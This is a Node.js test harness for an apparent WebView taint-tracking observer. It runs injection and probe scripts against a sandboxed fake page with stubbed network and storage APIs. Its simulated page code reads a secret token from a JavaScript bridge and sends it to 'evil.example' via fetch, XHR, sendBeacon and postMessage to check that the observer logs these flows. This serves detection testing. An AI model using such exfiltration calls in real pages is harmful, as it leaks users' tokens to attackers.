// Test harness: run the page-side observer (legacy templates or bundled browser sources) against a fake page.
// Usage: node browser_harness.js <legacy|bundle> <path-to-legacy-webview.js-or-built-agent.js>
"use strict";

const fs = require("fs");
const vm = require("vm");

const [mode, path] = process.argv.slice(2);
const source = fs.readFileSync(path, "utf8");

const agentContext = vm.createContext({
  Java: { perform() {}, use() { return {}; }, registerClass() { return {}; } },
  console,
  setInterval() {},
});

const exportsExpr =
  mode === "legacy"
    ? `({
        inj: buildInjectionScript(),
        probe: (id) => buildProbeScript(id),
        taint: (i, m, s) => buildBridgeTaintScript(i, m, s),
        ns: SENTRY_NAMESPACE,
      })`
    : `({
        inj: renderBrowserScript("observer", { __SENTRY_NAMESPACE__: SENTRY_NAMESPACE }),
        probe: (id) => renderBrowserScript("probe", { __SENTRY_NAMESPACE__: SENTRY_NAMESPACE, __SENTRY_WEBVIEW_ID__: id }),
        taint: (i, m, s) => renderBrowserScript("bridgeTaint", {
          __SENTRY_NAMESPACE__: SENTRY_NAMESPACE,
          __SENTRY_INTERFACE_NAME__: i,
          __SENTRY_METHOD_NAME__: m,
          __SENTRY_SOURCE__: s,
        }),
        ns: SENTRY_NAMESPACE,
      })`;

const api = vm.runInContext(source + "\n;" + exportsExpr, agentContext);

const page = vm.createContext({});
vm.runInContext(
  `
  var window = globalThis;
  window.fetch = function fetch(url) { return "fetched"; };
  window.open = function open(url) { return null; };
  window.postMessage = function postMessage(message, origin) {};
  window.navigator = { sendBeacon: function sendBeacon(url, data) { return true; } };
  function Location() { this.href = "https://app.example/"; }
  Location.prototype.assign = function assign(url) {};
  Location.prototype.replace = function replace(url) {};
  window.Location = Location;
  window.location = new Location();
  function XMLHttpRequest() {}
  XMLHttpRequest.prototype.open = function open(method, url) {};
  XMLHttpRequest.prototype.send = function send(body) {};
  window.XMLHttpRequest = XMLHttpRequest;
  function Storage() { this._values = new Map(); }
  Storage.prototype.setItem = function setItem(key, value) { this._values.set(String(key), String(value)); };
  Storage.prototype.getItem = function getItem(key) {
    return this._values.has(String(key)) ? this._values.get(String(key)) : null;
  };
  window.Storage = Storage;
  window.localStorage = new Storage();
  window.sessionStorage = new Storage();
  window.AppBridge = {
    getToken: function getToken() { return "tok-123-secret"; },
    log: function log(value) {},
  };
  `,
  page,
);

const results = {};
results.inject1 = vm.runInContext(api.inj, page);
results.inject2 = vm.runInContext(api.inj, page);
results.taintMissing = vm.runInContext(api.taint("Missing", "nope", { kind: "x" }), page);
results.taint = vm.runInContext(
  api.taint("AppBridge", "getToken", { kind: "javascript-bridge-return", interfaceName: "AppBridge", methodName: "getToken" }),
  page,
);
results.taintAgain = vm.runInContext(api.taint("AppBridge", "getToken", { kind: "again" }), page);

vm.runInContext(
  `
  var token = AppBridge.getToken();
  localStorage.setItem("k", token);
  localStorage.getItem("k");
  localStorage.getItem("other");
  fetch("http://evil.example/x?t=" + token);
  fetch({ url: "https://api.example/obj" });
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://evil.example/");
  xhr.send(token);
  navigator.sendBeacon("https://b.example", token);
  postMessage(token, "*");
  open("https://w.example");
  location.assign("https://a.example");
  location.replace("https://r.example");
  window.eval("1 + 1");
  AppBridge.log({ nested: { deeper: { deepest: [1, 2, 3] } }, fn: function named() {} });
  `,
  page,
);

results.probe = JSON.parse(vm.runInContext(api.probe("wv-1"), page));
results.probeEmpty = JSON.parse(vm.runInContext(api.probe(7), page));

const text = JSON.stringify(results)
  .split(api.ns).join("NS")
  .replace(/"timestamp":"[^"]+"/g, '"timestamp":"T"')
  .replace(/taint-\d+-\d+/g, "taint-N");
process.stdout.write(text + "\n");
